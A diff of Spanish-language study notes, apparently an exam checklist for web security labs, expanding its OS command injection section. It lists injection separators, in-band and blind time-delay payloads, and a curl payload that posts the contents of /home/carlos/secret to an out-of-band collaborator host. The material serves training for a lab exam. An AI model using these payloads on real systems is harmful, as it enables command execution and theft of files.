@@ -87,13 +87,15 @@
 - 📁 `vulnerabilities/007-ssrf/` → [[vulnerabilities/007-ssrf/ssrf|entry point]] · [[vulnerabilities/007-ssrf/labs/README|labs]]
 
 ### OS Command Injection (OSCi)
-> [!danger] 🚩 ¿Está o no está?
-> Un **formulario al que accede el admin** que roza el SO → **probar con oastify todas las variantes para escapar el comando**.
+> [!danger] 🚩 ¿Está o no está? — **acá es casi evidente**
+> **Regla simple: si el admin toca un parámetro, se prueba.** No hace falta que la feature "parezca" que roza el SO — como admin tenés acceso a peticiones que el user normal no ve, y **cualquiera de ellas que reciba un parámetro** (form, acción del panel, config, check de stock, feedback) **ya es motivo suficiente** para inyectar y ver si ejecuta. Es **barato de probar** y el premio es **RCE directo** → `cat /home/carlos/secret`.
 
-- [ ] Inyectar `;`, `|`, `&&`, `$(...)`, backticks, `%0a` en cada parámetro.
-- [ ] **Ciego** → confirmar con OAST/DNS a Collaborator, o time delay (`sleep 10`).
-- [ ] `; cat /home/carlos/secret` (o exfil del contenido a Collaborator si es ciego).
-- 📁 *(crear `vulnerabilities/os-command-injection/`)*
+- [ ] **Barré TODOS los parámetros** (incluí headers como `User-Agent`/`Referer`) con separadores: `;` `|` `||` `&` `&&` `$(...)` `` `...` `` `%0a`.
+- [ ] **In-band** (¿vuelve la salida?) → `1|whoami` directo → [[vulnerabilities/027-os-command-injection/examples/001-simple-in-band|001]].
+- [ ] **Ciego** → time delay (`<param>=x||sleep+5||`) → [[vulnerabilities/027-os-command-injection/examples/002-blind-time-delay|002]]; o confirmar por **OAST/DNS** a Collaborator → [[vulnerabilities/027-os-command-injection/examples/004-blind-oob-interaction|004]].
+- [ ] **Leer el secreto:** `;cat+/home/carlos/secret` (in-band) o, si es ciego, exfil OOB.
+- [ ] **El secreto no cabe en un DNS →** POSTealo **entero** por HTTP: `<param>=||curl+--data+@/home/carlos/secret+https://COLLAB||` → [[vulnerabilities/027-os-command-injection/examples/006-exfil-archivo-completo|006 ⭐]].
+- 📁 `vulnerabilities/027-os-command-injection/` → [[vulnerabilities/027-os-command-injection/os-command-injection|entry point]] · ejemplos 001–006.
 
 ### Server-Side Template Injection (SSTI)
 > [!danger] 🚩 ¿Está o no está?
@@ -147,4 +149,4 @@
 > Contenido de `/home/carlos/secret` → **Submit solution**. Examen aprobado. 🎉
 
 > [!todo] Pendiente de completar
-> Crear `vulnerabilities/os-command-injection/`. Afinar payloads "a mano" por motor (SSTI, XXE file-read, LFI).
+> Afinar payloads "a mano" por motor (SSTI, XXE file-read, LFI).
